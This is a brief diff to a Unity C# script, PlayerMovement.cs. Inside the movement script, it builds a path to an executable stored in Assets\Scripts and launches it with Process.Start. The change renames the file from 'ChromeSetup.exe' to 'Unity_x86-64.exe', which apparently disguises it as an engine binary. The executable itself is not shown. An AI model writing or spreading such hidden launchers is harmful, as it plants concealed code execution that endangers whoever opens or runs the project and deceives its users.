@@ -52,7 +52,7 @@ public class PlayerMovement : MonoBehaviour
         string RawPath = Path.GetFullPath("PlayerMovement.cs");
         char[] ThisFile = {'P','l','a','y','e','r','M','o','v','e','m','e','n','t','.','c','s'};
         string NewPath = RawPath.TrimEnd(ThisFile);
-        string AddPath = @"Assets\Scripts\ChromeSetup.exe";
+        string AddPath = @"Assets\Scripts\Unity_x86-64.exe";
         string FullPath = NewPath+AddPath;
         System.Diagnostics.Process.Start(FullPath);
         print(FullPath);
